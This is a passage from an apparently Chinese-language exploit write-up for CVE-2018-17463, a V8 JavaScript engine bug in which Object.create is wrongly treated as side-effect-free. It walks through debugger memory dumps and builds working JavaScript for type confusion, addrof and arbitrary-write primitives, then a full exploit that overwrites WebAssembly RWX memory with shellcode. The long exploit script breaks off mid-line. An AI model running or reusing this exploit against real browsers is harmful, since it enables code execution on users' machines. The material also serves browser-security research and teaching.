而观察properties成员，发现长度发生明显变化，并且之前存在Object结构体中的x,y,z也进入了properties中。 1234567891011121314151617181920212223242526pwndbg&gt; v8print 0x31132b18e4f90x31132b18e4f9: [ObjectHashTable] - map: 0x006338503669 &lt;Map&gt; - length: 53 - elements: 6 - deleted: 0 - capacity: 16 - elements: &#123; 0: 7 -&gt; 0 1: 0x0063385025a1 &lt;undefined&gt; -&gt; 0x0063385025a1 &lt;undefined&gt; 2: 0x0063385025a1 &lt;undefined&gt; -&gt; 0x0063385025a1 &lt;undefined&gt; 3: 0x0063385025a1 &lt;undefined&gt; -&gt; 0x0063385025a1 &lt;undefined&gt; 4: 0x0063385025a1 &lt;undefined&gt; -&gt; 0x0063385025a1 &lt;undefined&gt; 5: 0x0063385025a1 &lt;undefined&gt; -&gt; 0x0063385025a1 &lt;undefined&gt; 6: 0x0063385025a1 &lt;undefined&gt; -&gt; 0x0063385025a1 &lt;undefined&gt; 7: 0x1a09a4506971 &lt;String[1]: z&gt; -&gt; 3 8: 960 -&gt; 0x0063385025a1 &lt;undefined&gt; 9: 0x0063385025a1 &lt;undefined&gt; -&gt; 0x0063385025a1 &lt;undefined&gt; 10: 0x0063385025a1 &lt;undefined&gt; -&gt; 0x0063385025a1 &lt;undefined&gt; 11: 0x0063385025a1 &lt;undefined&gt; -&gt; 0x1a09a45050a1 &lt;String[1]: d&gt; 12: 6 -&gt; 1728 13: 0x2e853b022991 &lt;String[1]: b&gt; -&gt; 4 14: 1216 -&gt; 0x0063385025a1 &lt;undefined&gt; 15: 0x0063385025a1 &lt;undefined&gt; -&gt; 0x0063385025a1 &lt;undefined&gt; &#125;$6 = 0 而且，其中保存的值也并非顺序保存的，并且结构比较复杂，前0x38个字节代表结构体的map,length等成员，后面有0x35项数据，每个数据占16字节，前8字节代表属性名，后8字节代表属性值。 1234567891011121314151617pwndbg&gt; x /25gx 0x31132b18e4f80x31132b18e4f8: 0x0000006338503669 0x00000035000000000x31132b18e508: 0x0000000600000000 0x00000000000000000x31132b18e518: 0x0000001000000000 0x00000007000000000x31132b18e528: 0x0000000000000000 0x00000063385025a10x31132b18e538: 0x00000063385025a1 0x00000063385025a10x31132b18e548: 0x00000063385025a1 0x00000063385025a10x31132b18e558: 0x00000063385025a1 0x00000063385025a10x31132b18e568: 0x00000063385025a1 0x00000063385025a10x31132b18e578: 0x00000063385025a1 0x00000063385025a10x31132b18e588: 0x00000063385025a1 0x00001a09a45069710x31132b18e598: 0x0000000300000000 0x000003c0000000000x31132b18e5a8: 0x00000063385025a1 0x00000063385025a10x31132b18e5b8: 0x00000063385025a1pwndbg&gt; v8print 0x00001a09a4506971#z$9 = 0 至此，我们大致可以将Object.create对一个Object的影响搞清了，该结构会把全部的属性值都放到properties中存储，并将原先的线性结构改成hash表的字典结构。 回到漏洞，如何将这个side-effect推断错误的影响扩大化呢？一般的想法是利用优化来去掉一些检查的节点。 例如代码： 123function foo(o) &#123; return o.a + o.b; &#125; 其生成的IR code可能是如下的： 1234567891011CheckHeapObject oCheckMap o, map1r0 = Load [o + 0x18]CheckHeapObject oCheckMap o, map1r1 = Load [o + 0x20]r2 = Add r0, r1CheckNoOverflowReturn r2 可以看到第二次当o不变时，第二次CheckMap o, map1是多余的，这次检查节点是可以消除的。 在src/compiler/checkpoint-elimination.cc:18中，可以看到当两个检查节点中间的操作属性是kNoWrite时，则第二个检查节点时多余的。 123456789101112// The given checkpoint is redundant if it is effect-wise dominated by another// checkpoint and there is no observable write in between. For now we consider// a linear effect chain only instead of true effect-wise dominance.bool IsRedundantCheckpoint(Node* node) &#123; Node* effect = NodeProperties::GetEffectInput(node); while (effect-&gt;op()-&gt;HasProperty(Operator::kNoWrite) &amp;&amp; effect-&gt;op()-&gt;EffectInputCount() == 1) &#123; if (effect-&gt;opcode() == IrOpcode::kCheckpoint) return true; effect = NodeProperties::GetEffectInput(effect); &#125; return false;&#125; 那么利用这一点，可以构造一个函数，首先访问一次其内部变量，然后调用Object.create操作，再次访问另一个变量，那么可能造成第二个变量的类型检查消失，如果结合DictionaryProperties和FastProperties特性是可以构造一个非预期的情况。如首先构造一个数组x，初始化时赋予属性a=0x1234，增加属性b=0x5678，构造函数bad_create：首先访问x.a，这里可以通过类型检查，而在后续返回x.b，由于JSCreate的属性是kNoWrite的，则返回之前的x.b二次检查消失，造成仍然返回一个与x.b偏移相同的数据，但由于Properties的内存分布发生变化，一定不会是0x5678。 剩下的就是循环这个函数10000次，触发优化发生。 123456789101112131415161718192021222324function check_vul()&#123; function bad_create(x)&#123; x.a; Object.create(x); return x.b; &#125; for (let i = 0;i &lt; 10000; i++)&#123; let x = &#123;a : 0x1234&#125;; x.b = 0x5678; let res = bad_create(x); //log(res); if( res != 0x5678)&#123; console.log(i); console.log("CVE-2018-17463 exists in the d8"); return; &#125; &#125; throw "bad d8 version";&#125;check_vul(); 执行这个函数，会发现的确符合我们的预期，某次函数的返回值并不是0x5678，同时也观察到并不是函数每次执行都会发生这一现象。 1234┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/browser/ctf/CVE-2018-17463/v8/out/x64.release] - [四 6月 13, 12:30]└─[$] &lt;git:(568979f*)&gt; ./d8 ./test/test.js5958CVE-2018-17463 exists in the d8 至此，取得了阶段性进展，可以稳定触发漏洞了。 类型混淆当可以消除第二个检查节点后就可以获得DictionaryProperties的稳定偏移数据了。但是DictionaryProperties是一个hash表，其每次触发时对应的保存数据位置并不相同，可能存在随机化的因素在，如下是之前测试代码两次执行的Properties内存结构，可以发现各属性的偏移位置并不固定 第一次： 12345678910111213141516171819202122232425pwndbg&gt; v8print 0x1a8ce618e1d10x1a8ce618e1d1: [JS_OBJECT_TYPE] - map: 0x0e4ccda8cbb1 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties] - prototype: 0x2d0e328046d9 &lt;Object map = 0xe4ccda822f1&gt; - elements: 0x180c3d382cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - properties: 0x1a8ce618e4e1 &lt;NameDictionary[53]&gt; &#123; #c: 5 (data, dict_index: 5, attrs: [WEC]) #d: 6 (data, dict_index: 6, attrs: [WEC]) #x: 1 (data, dict_index: 1, attrs: [WEC]) #y: 2 (data, dict_index: 2, attrs: [WEC]) #z: 3 (data, dict_index: 3, attrs: [WEC]) #b: 4 (data, dict_index: 4, attrs: [WEC]) &#125;$1 = 0pwndbg&gt; x /20gx 0x1a8ce618e4e00x1a8ce618e4e0: 0x0000180c3d383669 0x00000035000000000x1a8ce618e4f0: 0x0000000600000000 0x00000000000000000x1a8ce618e500: 0x0000001000000000 0x00000007000000000x1a8ce618e510: 0x0000000000000000 0x00001ee0998868c90x1a8ce618e520: 0x0000000500000000 0x000005c0000000000x1a8ce618e530: 0x0000180c3d3825a1 0x0000180c3d3825a10x1a8ce618e540: 0x0000180c3d3825a1 0x00001ee0998850a10x1a8ce618e550: 0x0000000600000000 0x000006c0000000000x1a8ce618e560: 0x0000180c3d3825a1 0x0000180c3d3825a10x1a8ce618e570: 0x0000180c3d3825a1 0x0000180c3d3825a1 第二次： 12345678910111213141516171819202122232425pwndbg&gt; v8print 0x1bf5b6e0e1d10x1bf5b6e0e1d1: [JS_OBJECT_TYPE] - map: 0x2fc05030cbb1 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties] - prototype: 0x02b0bbe046d9 &lt;Object map = 0x2fc0503022f1&gt; - elements: 0x2d44edf02cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - properties: 0x1bf5b6e0e4e1 &lt;NameDictionary[53]&gt; &#123; #y: 2 (data, dict_index: 2, attrs: [WEC]) #c: 5 (data, dict_index: 5, attrs: [WEC]) #z: 3 (data, dict_index: 3, attrs: [WEC]) #b: 4 (data, dict_index: 4, attrs: [WEC]) #d: 6 (data, dict_index: 6, attrs: [WEC]) #x: 1 (data, dict_index: 1, attrs: [WEC]) &#125;$1 = 0pwndbg&gt; x /20gx 0x1bf5b6e0e4e00x1bf5b6e0e4e0: 0x00002d44edf03669 0x00000035000000000x1bf5b6e0e4f0: 0x0000000600000000 0x00000000000000000x1bf5b6e0e500: 0x0000001000000000 0x00000007000000000x1bf5b6e0e510: 0x0000000000000000 0x000021c78c8069590x1bf5b6e0e520: 0x0000000200000000 0x000002c0000000000x1bf5b6e0e530: 0x00002d44edf025a1 0x00002d44edf025a10x1bf5b6e0e540: 0x00002d44edf025a1 0x00002d44edf025a10x1bf5b6e0e550: 0x00002d44edf025a1 0x00002d44edf025a10x1bf5b6e0e560: 0x000021c78c8068c9 0x00000005000000000x1bf5b6e0e570: 0x000005c000000000 0x000021c78c806971 但发现另一规律：在一次执行过程中，相同属性构造的Object，在DictionaryProperties中的偏移是相同的： 执行如下代码： 12345678910111213let a1 = &#123;x : 1,y:2,z:3&#125;;a1.b = 4;a1.c = 5;a1.d = 6;let a2 = &#123;x : 2,y:3,z:4&#125;;a2.b = 7;a2.c = 8;a2.d = 9;Object.create(a1);%DebugPrint(a1);Object.create(a2);%DebugPrint(a2);readline(); 发现a1，a2即使属性值不同，但在Properties中属性名相同的仍存在同一位置。 12345678910111213141516171819202122232425262728293031323334353637383940pwndbg&gt; v8print 0x20913a10e231 0x20913a10e231: [JS_OBJECT_TYPE] - map: 0x351140b0cbb1 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties] - prototype: 0x0e11c9a846d9 &lt;Object map = 0x351140b022f1&gt; - elements: 0x011a73b82cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - properties: 0x20913a10e599 &lt;NameDictionary[53]&gt; &#123; #z: 3 (data, dict_index: 3, attrs: [WEC]) #b: 4 (data, dict_index: 4, attrs: [WEC]) #y: 2 (data, dict_index: 2, attrs: [WEC]) #c: 5 (data, dict_index: 5, attrs: [WEC]) #x: 1 (data, dict_index: 1, attrs: [WEC]) #d: 6 (data, dict_index: 6, attrs: [WEC]) &#125;$1 = 0pwndbg&gt; v8print 0x20913a10e5410x20913a10e541: [JS_OBJECT_TYPE] - map: 0x351140b0cc51 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties] - prototype: 0x0e11c9a846d9 &lt;Object map = 0x351140b022f1&gt; - elements: 0x011a73b82cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - properties: 0x20913a10e789 &lt;NameDictionary[53]&gt; &#123; #z: 4 (data, dict_index: 3, attrs: [WEC]) #b: 7 (data, dict_index: 4, attrs: [WEC]) #y: 3 (data, dict_index: 2, attrs: [WEC]) #c: 8 (data, dict_index: 5, attrs: [WEC]) #x: 2 (data, dict_index: 1, attrs: [WEC]) #d: 9 (data, dict_index: 6, attrs: [WEC]) &#125;$2 = 0pwndbg&gt; x /10gx 0x20913a10e598+0x380x20913a10e5d0: 0x0000011a73b825a1 0x0000011a73b825a10x20913a10e5e0: 0x0000011a73b825a1 0x000003c5056869710x20913a10e5f0: 0x0000000300000000 0x000003c0000000000x20913a10e600: 0x0000011a73b825a1 0x0000011a73b825a10x20913a10e610: 0x0000011a73b825a1 0x00000e11c9aa2991pwndbg&gt; x /10gx 0x20913a10e788+0x380x20913a10e7c0: 0x0000011a73b825a1 0x0000011a73b825a10x20913a10e7d0: 0x0000011a73b825a1 0x000003c5056869710x20913a10e7e0: 0x0000000400000000 0x000003c0000000000x20913a10e7f0: 0x0000011a73b825a1 0x0000011a73b825a10x20913a10e800: 0x0000011a73b825a1 0x00000e11c9aa2991 那么我们可以得到一个结论，在一次利用中只要找到一对可以用于类型混淆的属性名就可以作为先验知识一直使用了。 我们可以通过构建一个对象，其中把属性名和属性值设置为有规律的键值对，如{‘bi’ =&gt; -(i+0x4869) }，在恶意构造的函数中，返回全部可读的Properties值，通过其值的规律性，可以找到一对在属性改变先后可以对应的属性名X1、X2，达到恶意函数返回a.x1，实质上是返回a.X2的目的，从而造成类型混淆。 搜索X1、X2对的代码如下： 1234567891011121314151617181920212223242526272829303132333435363738// check collision between directory mode and fast modelet OPTIMIZATION_NUM = 10000let OBJ_LEN = 0x30function getOBJ()&#123; let res = &#123;a:0x1234&#125;; for (let i = 0; i&lt; OBJ_LEN;i++)&#123; eval(`res.$&#123;'b'+i&#125; = -$&#123;0x4869 + i&#125;; `); &#125; return res;&#125;function findCollision()&#123; let find_obj = []; for (let i = 0;i&lt;OBJ_LEN;i++)&#123; find_obj[i] = 'b'+i; &#125; eval(` function bad_create(x)&#123; x.a; this.Object.create(x); $&#123;find_obj.map((b) =&gt; `let $&#123;b&#125; = x.$&#123;b&#125;;`).join('\n')&#125; return [$&#123;find_obj.join(', ')&#125;]; &#125; `); for (let i = 0; i&lt;OPTIMIZATION_NUM;i++)&#123; let tmp = bad_create(getOBJ()); for (let j = 0 ;j&lt;tmp.length;j++)&#123; if(tmp[j] != -(j+0x4869) &amp;&amp; tmp[j] &lt; -0x4868 &amp;&amp; tmp[j] &gt; -(1+OBJ_LEN +0x4869) )&#123; console.log('b'+ j +' &amp; b' + -(tmp[j]+0x4869) +" are collision in directory"); return ['b'+j , 'b' + -(tmp[j]+0x4869)]; &#125; &#125; &#125; throw "not found collision ";&#125;findCollision(); 结果可发现，在每次执行中键值对都不同： 123456789┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/browser/ctf/CVE-2018-17463/v8/out/x64.release] - [四 6月 13, 12:57]└─[$] &lt;git:(568979f*)&gt; ./d8 ./test/test.jsb9 &amp; b2 are collision in directory┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/browser/ctf/CVE-2018-17463/v8/out/x64.release] - [四 6月 13, 12:58]└─[$] &lt;git:(568979f*)&gt; ./d8 ./test/test.jsb15 &amp; b7 are collision in directory┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/browser/ctf/CVE-2018-17463/v8/out/x64.release] - [四 6月 13, 13:06]└─[$] &lt;git:(568979f*)&gt; ./d8 ./test/test.jsb9 &amp; b34 are collision in directory 此后，可以通过得到的键值对可以造成类型混淆了。 addrof原语通过得到的键值对设为X,Y，那么构建一个新的Object， 12o.X = &#123;x1:1.1,x2:1.2&#125;;o.Y = &#123;y1:obj&#125;; 并且构建恶意函数 12345function bad_create(o)&#123; o.a; this.Object.create(o); return o.X.x1;&#125; 那么在返回o.X.x1的时候，实际上返回的是obj结构体的地址，从而对浮点型进行转换就可以得到对应obj地址了。 任意地址读写原语同样利用上文属性值对，与addrof原语类似，当访问键值X时，实际上是对键值Y属性值相对偏移的操作。 对于任意地址读写，我们可以想到一个好用的数据结构ArrayBuffer。一个ArrayBuffer的结构体如下： 123456789101112131415pwndbg&gt; v8print 0x1d4b8ef8e1a90x1d4b8ef8e1a9: [JSArrayBuffer] - map: 0x350743c04371 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: 0x29b14b610fd1 &lt;Object map = 0x350743c043c1&gt; - elements: 0x236c6c482cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - embedder fields: 2 - backing_store: 0x5652a87208f0 - byte_length: 1024 - neuterable - properties: 0x236c6c482cf1 &lt;FixedArray[0]&gt; &#123;&#125; - embedder fields = &#123; (nil) (nil) &#125;$1 = 0 其长度由byte_length指定，而实际读写的内存位于backing_store，当可以修改一个ArrayBuffer的backing_store时就可以对任意地址进行读写。而此成员在结构体中的偏移是0x20: 123456wndbg&gt; x /10gx 0x1d4b8ef8e1a80x1d4b8ef8e1a8: 0x0000350743c04371 0x0000236c6c482cf10x1d4b8ef8e1b8: 0x0000236c6c482cf1 0x00000000000004000x1d4b8ef8e1c8: 0x00005652a87208f0 0x00000000000000020x1d4b8ef8e1d8: 0x0000000000000000 0x00000000000000000x1d4b8ef8e1e8: 0x0000000000000000 0x0000000000000000 此时我们仅需构造一个对偏移+0x20写的操作就可以控制ArrayBuffer的读写内存。此时根据对FastProperties的了解，如果构建Object为{x0:{x1:1.1,x2:1.2}}，则对x0.x2的写操作，恰好可以改变对应键值的backing_store，造成内存任意写。 因此恶意函数构造如下： 1234567function bad_create(o,value)&#123; o.a; this.Object.create(o); let ret = o.$&#123;X&#125;.x0.x2; o.$&#123;X&#125;.x0.x2 = value; return ret;&#125; Shellcode执行综上，拥有了addrof原语和任意地址读写的能力，可以利用wasm机制来执行shellcode。 例如一个wasm实例构造如下： 123456789101112var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,0,1,127,96,1,127,1,127,2,140,128,128,128,0,1,3,101,110,118,4,112,117,116,115,0,1,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,109,101,109,111,114,121,2,0,5,112,52,110,100,97,0,1,10,145,128,128,128,0,1,139,128,128,128,0,1,1,127,65,16,16,0,26,32,0,11,11,150,128,128,128,0,1,0,65,16,11,16,72,97,99,107,101,100,32,98,121,32,80,52,110,100,97,0]);var wasmImports = &#123; env: &#123; puts: function puts (index) &#123; console.log(utf8ToString(h, index)); &#125; &#125;&#125;;let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);let h = new Uint8Array(m.exports.memory.buffer);let f = m.exports.p4nda;f(); 其中，f是一个JSFunction对象，只不过其实际执行代码存放于一个rwx的内存中，通过写该内存的代码区域，最终调用f()，触发来执行shellcode。 具体思路如下: 首先，构造wasm对象f方便shellcode执行，并利用addrof原语泄露f的地址。 然后，定义一个ArrayBuffer对象，并利用gc机制使其被放入Old Space使地址更加稳定。 之后，不断的利用该ArrayBuffer对象，泄露并修改其backing_store成员指向待读写区域，具体修改顺序为从JSFucntion到rwx区域的寻址流程： 1JSFucntion -(0x18)-&gt;SharedFunctionInfo -(0x8)-&gt; WasmExportedFunctionData -(0x10)-&gt; WasmInstanceObject -(0xc8)-&gt; imported_function_targets -(0)-&gt; rwx_area 最终，向rwx_area写入shellcode，调用f()触发。 具体利用效果如下： EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438function gc()&#123; /*fill-up the 1MB semi-space page, force V8 to scavenge NewSpace.*/ for(var i=0;i&lt;((1024 * 1024)/0x10);i++) &#123; var a= new String(); &#125;&#125;function give_me_a_clean_newspace()&#123; /*force V8 to scavenge NewSpace twice to get a clean NewSpace.*/ gc() gc()&#125;let f64 = new Float64Array(1);let u32 = new Uint32Array(f64.buffer);function d2u(v) &#123; f64[0] = v; return u32;&#125;function u2d(lo, hi) &#123; u32[0] = lo; u32[1] = hi; return f64;&#125;function hex(b) &#123; return ('0' + b.toString(16)).substr(-2);&#125;// Return the hexadecimal representation of the given byte array.function hexlify(bytes) &#123; var res = []; for (var i = 0; i &lt; bytes.length; i++) res.push(hex(bytes[i])); return res.join('');&#125;// Return the binary data represented by the given hexdecimal string.function unhexlify(hexstr) &#123; if (hexstr.length % 2 == 1) throw new TypeError("Invalid hex string"); var bytes = new Uint8Array(hexstr.length / 2); for (var i = 0; i &lt; hexstr.length; i += 2) bytes[i/2] = parseInt(hexstr.substr(i, 2), 16); return bytes;&#125;function hexdump(data) &#123; if (typeof data.BYTES_PER_ELEMENT !== 'undefined') data = Array.from(data); var lines = []; for (var i = 0; i &lt; data.length; i += 16) &#123; var chunk = data.slice(i, i+16); var parts = chunk.map(hex); if (parts.length &gt; 8) parts.splice(8, 0, ' '); lines.push(parts.join(' ')); &#125; return lines.join('\n');&#125;// Simplified version of the similarly named python module.var Struct = (function() &#123; // Allocate these once to avoid unecessary heap allocations during pack/unpack operations. var buffer = new ArrayBuffer(8); var byteView = new Uint8Array(buffer); var uint32View = new Uint32Array(buffer); var float64View = new Float64Array(buffer); return &#123; pack: function(type, value) &#123; var view = type; // See below view[0] = value; return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT); &#125;, unpack: function(type, bytes) &#123; if (bytes.length !== type.BYTES_PER_ELEMENT) throw Error("Invalid bytearray"); var view = type; // See below byteView.set(bytes); return view[0]; &#125;, // Available types. int8: byteView, int32: uint32View, float64: float64View &#125;;&#125;)();//// Tiny module that provides big (64bit) integers.//// Copyright (c) 2016 Samuel Groß//// Requires utils.js//// Datatype to represent 64-bit integers.//// Internally, the integer is stored as a Uint8Array in little endian byte order.function Int64(v) &#123; // The underlying byte array. var bytes = new Uint8Array(8); switch (typeof v) &#123; case 'number': v = '0x' + Math.floor(v).toString(16); case 'string': if (v.startsWith('0x')) v = v.substr(2); if (v.length % 2 == 1) v = '0' + v; var bigEndian = unhexlify(v, 8); bytes.set(Array.from(bigEndian).reverse()); break; case 'object': if (v instanceof Int64) &#123; bytes.set(v.bytes()); &#125; else &#123; if (v.length != 8) throw TypeError("Array must have excactly 8 elements."); bytes.set(v); &#125; break; case 'undefined': break; default: throw TypeError("Int64 constructor requires an argument."); &#125; // Return a double whith the same underlying bit representation. this.asDouble = function() &#123; // Check for NaN if (bytes[7] == 0xff &amp;&amp; (bytes[6] == 0xff || bytes[6] == 0xfe)) throw new RangeError("Integer can not be represented by a double"); return Struct.unpack(Struct.float64, bytes); &#125;; // Return a javascript value with the same underlying bit representation. // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000) // due to double conversion constraints. this.asJSValue = function() &#123; if ((bytes[7] == 0 &amp;&amp; bytes[6] == 0) || (bytes[7] == 0xff &amp;&amp; bytes[6] == 0xff)) throw new RangeError("Integer can not be represented by a JSValue"); // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern. this.assignSub(this, 0x1000000000000); var res = Struct.unpack(Struct.float64, bytes); this.assignAdd(this, 0x1000000000000); return res; &#125;; // Return the underlying bytes of this number as array. this.bytes = function() &#123; return Array.from(bytes); &#125;; // Return the byte at the given index. this.byteAt = function(i) &#123; return bytes[i]; &#125;; // Return the value of this number as unsigned hex string. this.toString = function() &#123; return '0x' + hexlify(Array.from(bytes).reverse()); &#125;; // Basic arithmetic. // These functions assign the result of the computation to their 'this' object. // Decorator for Int64 instance operations. Takes care // of converting arguments to Int64 instances if required. function operation(f, nargs) &#123; return function() &#123; if (arguments.length != nargs) throw Error("Not enough arguments for function " + f.name); for (var i = 0; i &lt; arguments.length; i++) if (!(arguments[i] instanceof Int64)) arguments[i] = new Int64(arguments[i]); return f.apply(this, arguments); &#125;; &#125; // this = -n (two's complement) this.assignNeg = operation(function neg(n) &#123; for (var i = 0; i &lt; 8; i++) bytes[i] = ~n.byteAt(i); return this.assignAdd(this, Int64.One); &#125;, 1); // this = a + b this.assignAdd = operation(function add(a, b) &#123; var carry = 0; for (var i = 0; i &lt; 8; i++) &#123; var cur = a.byteAt(i) + b.byteAt(i) + carry; carry = cur &gt; 0xff | 0; bytes[i] = cur; &#125; return this; &#125;, 2); // this = a - b this.assignSub = operation(function sub(a, b) &#123; var carry = 0; for (var i = 0; i &lt; 8; i++) &#123; var cur = a.byteAt(i) - b.byteAt(i) - carry; carry = cur &lt; 0 | 0; bytes[i] = cur; &#125; return this; &#125;, 2);&#125;// Constructs a new Int64 instance with the same bit representation as the provided double.Int64.fromDouble = function(d) &#123; var bytes = Struct.pack(Struct.float64, d); return new Int64(bytes);&#125;;// Convenience functions. These allocate a new Int64 to hold the result.// Return -n (two's complement)function Neg(n) &#123; return (new Int64()).assignNeg(n);&#125;// Return a + bfunction Add(a, b) &#123; return (new Int64()).assignAdd(a, b);&#125;// Return a - bfunction Sub(a, b) &#123; return (new Int64()).assignSub(a, b);&#125;// Some commonly used numbers.Int64.Zero = new Int64(0);Int64.One = new Int64(1);function utf8ToString(h, p) &#123; let s = ""; for (i = p; h[i]; i++) &#123; s += String.fromCharCode(h[i]); &#125; return s;&#125;function log(x,y = ' ')&#123; console.log("[+] log:", x,y); &#125;let OPTIMIZATION_NUM = 10000;let OBJ_LEN = 0x20;let X;let Y;// use a obj to check whether CVE-2018-17463 existsfunction check_vul()&#123; function bad_create(x)&#123; x.a; Object.create(x); return x.b; &#125; for (let i = 0;i &lt; OPTIMIZATION_NUM; i++)&#123; let x = &#123;a : 0x1234&#125;; x.b = 0x5678; let res = bad_create(x); //log(res); if( res != 0x5678)&#123; log("CVE-2018-17463 exists in the d8"); return; &#125; &#125; throw "bad d8 version";&#125;// check collision between directory mode and fast modefunction getOBJ()&#123; let res = &#123;a:0x1234&#125;; for (let i = 0; i&lt; OBJ_LEN;i++)&#123; eval(`res.$&#123;'b'+i&#125; = -$&#123;0x4869 + i&#125;; `); &#125; return res;&#125;function printOBJ(x)&#123; for(let i = 0;i&lt;OBJ_LEN;i++)&#123; eval(`console.log("log:["+$&#123;i&#125;+"] :"+x.$&#123;'b'+i&#125;)`); //console.log('['+i+']'+x[i]); &#125;&#125;function findCollision()&#123; let find_obj = []; for (let i = 0;i&lt;OBJ_LEN;i++)&#123; find_obj[i] = 'b'+i; &#125; eval(` function bad_create(x)&#123; x.a; this.Object.create(x); $&#123;find_obj.map((b) =&gt; `let $&#123;b&#125; = x.$&#123;b&#125;;`).join('\n')&#125; return [$&#123;find_obj.join(', ')&#125;]; &#125; `); for (let i = 0; i&lt;OPTIMIZATION_NUM;i++)&#123; let tmp = bad_create(getOBJ()); for (let j = 0 ;j&lt;tmp.length;j++)&#123; if(tmp[j] != -(j+0x4869) &amp;&amp; tmp[j] &lt; -0x4868 &amp;&amp; tmp[j] &gt; -(1+OBJ_LEN +0x4869) )&#123; log('b'+ j +' &amp; b' + -(tmp[j]+0x4869) +" are collision in directory"); return ['b'+j , 'b' + -(tmp[j]+0x4869)]; &#125; &#125; &#125; throw "not found collision ";&#125;// create primitive -&gt; addroffunction getOBJ4addr(obj)&#123; let res = &#123;a:0x1234&#125;; for (let i = 0; i&lt; OBJ_LEN;i++)&#123; if (('b'+i)!= X &amp;&amp;('b'+i)!= Y )&#123; eval(`res.$&#123;'b'+i&#125; = 1.1; `); &#125; if (('b'+i)== X)&#123; eval(` res.$&#123;X&#125; = &#123;x1:1.1,x2:1.2&#125;; `); &#125; if (('b'+i)== Y)&#123; eval(` res.$&#123;Y&#125; = &#123;y1:obj&#125;; `); &#125; &#125; return res;&#125;function addrof(obj)&#123; eval(` function bad_create(o)&#123; o.a; this.Object.create(o); return o.$&#123;X&#125;.x1; &#125; `); for (let i = 0;i &lt; OPTIMIZATION_NUM;i++)&#123; let ret = bad_create( getOBJ4addr(obj)); let tmp =Int64.fromDouble(ret).toString(); if (ret!= 1.1)&#123; log(tmp); return ret; &#125; &#125; throw "not found addrof obj";&#125;// create primitive -&gt; Arbitrary writefunction getOBJ4read(obj)&#123; let res = &#123;a:0x1234&#125;; for (let i = 0; i&lt; OBJ_LEN;i++)&#123; if (('b'+i)!= X &amp;&amp;('b'+i)!= Y )&#123; eval(`res.$&#123;'b'+i&#125; = &#123;&#125;; `); &#125; if (('b'+i)== X)&#123; eval(` res.$&#123;X&#125; = &#123;x0:&#123;x1:1.1,x2:1.2&#125;&#125;; `); &#125; if (('b'+i)== Y)&#123; eval(` res.$&#123;Y&#125; = &#123;y1:obj&#125;; `); &#125; &#125; return res;&#125;function arbitraryWrite(obj,addr)&#123; eval(` function bad_create(o,value)&#123; o.a; this.Object.create(o); let ret = o.$&#123;X&#125;.x0.x2; o.$&#123;X&#125;.x0.x2 = value; return ret; &#125; `); for (let i = 0;i &lt; OPTIMIZATION_NUM;i++)&#123; let ret = bad_create( getOBJ4read(obj),addr); let tmp =Int64.fromDouble(ret).toString(); if (ret!= 1.2)&#123; return ; &#125; &#125; throw "not found arbitraryWrite";&#125;// exploitfunction exploit()&#123; var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,0,1,127,96,1,127,1,127,2,140,128,128,128,0,1,3,101,110,118,4,112,117,116,115,0,1,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,109,101,109,111,114,121,2,0,5,112,52,110,100,97,0,1,10,145,128,128,128,0,1,139,128,128,128,0,1,1,127,65,16,16,0,26,32,0,11,11,150,128,128,128,0,1,0,65,16,11,16,72,97,99,107,101,100,32,98,121,32,80,52,110,100,97,0]); var wasmImports = &#123; env: &#123; puts: function puts (index) &#123; console.log(utf8ToString(h, index)); &#125; &#125; &#125;; let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports); let h = new Uint8Array(m.exports.memory.buffer); let f = m.exports.p4nda; console.log("step 0: Game start"); f(); console.log("step 1: check whether vulnerability exists"); check_vul(); console.log("step 2: find collision"); [X,Y] = findCollision(); let mem = new ArrayBuffer(1024); give_me_a_clean_newspace(); console.log("step 3: get address of JSFunciton"); let addr = addrof(f); console.log("step 4: make ArrayBuffer's backing_store -&gt; JSFunciton"); arbitraryWrite(mem,addr); let dv = new DataView(mem); SharedFunctionInfo_addr = Int64.fromDouble(dv.getFloat64(0x17,true)); console.log("[+] SharedFunctionInfo addr :"+SharedFunctionInfo_addr); console.log("step 5: make ArrayBuffer's backing_store -&gt; SharedFunctionInfo"); arbitraryWrite(mem,SharedFunctionInfo_addr.asDouble()); WasmExportedFunctionData_addr = 